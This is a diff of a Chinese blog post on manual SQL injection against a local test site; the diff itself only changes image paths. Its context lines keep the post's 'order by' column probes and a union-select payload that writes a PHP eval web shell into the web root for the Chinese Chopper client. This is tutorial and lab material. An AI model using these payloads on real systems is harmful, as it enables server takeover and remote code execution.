@@ -9,9 +9,9 @@ description: 简单的 SQL 手工注入得到一些信息。
 
 平台: Windows + Apache + PHP + MySQL
 
-![20160904221051.png](../../images/20160904221051.png)
+![20160904221051.png](/images/20160904221051.png)
 
-![20160904221114.png](../../images/20160904221114.png)
+![20160904221114.png](/images/20160904221114.png)
 
 index.php
 
@@ -115,9 +115,9 @@ article.php
 
 使用 order by 手工测试数据列数，当链接为 `127.0.0.1/test/article.php?id=1 order by 3 -- ` 时返回正常页面， `127.0.0.1/test/article.php?id=1 order by 4 -- ` 时无法返回正常页面，由此得知数据应有 3 列。
 
-![20160904200455.png](../../images/20160904200455.png)
+![20160904200455.png](/images/20160904200455.png)
 
-![20160904200751.png](../../images/20160904200751.png)
+![20160904200751.png](/images/20160904200751.png)
 
 ### 得到数据库基本信息
 
@@ -231,4 +231,4 @@ Ubuntu :
 
 `http://127.0.0.1/test/article.php?id=-1 union select 1,2,"<?php @eval($_POST['pass'])?>" into outfile "C:\\apache24\\htdocs\\test\\caidao.php" --`  写入 webshell ，成功连入菜刀
 
-![20160904221012.png](../../images/20160904221012.png)
+![20160904221012.png](/images/20160904221012.png)
